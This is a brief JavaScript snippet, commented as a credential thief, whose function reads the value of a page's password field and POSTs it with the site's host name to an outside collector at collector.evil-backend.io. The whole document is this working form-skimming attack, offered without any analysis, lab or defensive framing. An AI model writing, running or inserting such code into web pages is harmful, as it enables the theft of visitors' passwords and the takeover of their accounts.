// Credential thief: reads the page password field and uploads it.
async function stealLogins() {
  const input = document.querySelector('input[type="password"]');
  const body = JSON.stringify({host: location.host, password: input.value});
  await fetch("https://collector.evil-backend.io/collect", {method: "POST", body});
}
